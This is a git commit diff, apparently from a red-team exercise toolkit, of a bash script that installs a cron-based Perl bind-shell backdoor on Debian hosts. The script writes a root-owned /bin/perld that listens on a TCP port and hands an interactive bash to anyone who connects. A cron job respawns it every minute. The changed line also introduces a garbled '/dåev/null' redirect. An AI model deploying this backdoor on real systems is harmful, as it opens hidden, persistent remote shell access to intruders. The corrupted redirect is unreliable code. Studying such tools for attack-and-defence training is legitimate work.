b12ab9feb8d3dc2fa6fd8d7cb5bd6c1e0ff20f5d
lukem1 <37024616+lukem1@users.noreply.github.com>
2022-01-29 18:26:03 -0500

    perld: updated comments

--- images/scripts/blue_cron_bind_shell.sh
+++ images/scripts/blue_cron_bind_shell.sh
@@ -2,9 +2,14 @@
 
 # Name: Cronjob BIND Shell Backdoor
 # Notes: 
-# - Creates cron job in /etc/cron.d/bshd
+# - Creates cron job in /etc/cron.d/perld
 # - Usage: ./blue_cron_bind_shell.sh
 # - Set port with PORT env var, default is 50042
+#   if the port is taken another available port will be used
+# - Spawns a new shell every minute
+#   - ie if a target host is up for 5 minutes there will
+#     5 bind shells running. 1 on the specified port and
+#     the rest on other available ports.
 # Valid Targets: Blue team debian based images
 
 if [[ ! -v PORT ]]
@@ -21,9 +26,9 @@ SCRIPT="use Socket;\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"
 bind(S,sockaddr_in(\$p, INADDR_ANY));listen(S,SOMAXCONN);for(;\$p=accept(C,S);\
 close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/bash -i\");};"
 
-# Place scripts at /bin/perld and set permissions
+# Place script at /bin/perld and set permissions
 echo "Creating script..."
-echo "$SCRIPT" | sudo tee /bin/perld > /dev/null
+echo "$SCRIPT" | sudo tee /bin/perld > /dåev/null
 sudo chown root /bin/perld
 sudo chmod 700 /bin/perld
 
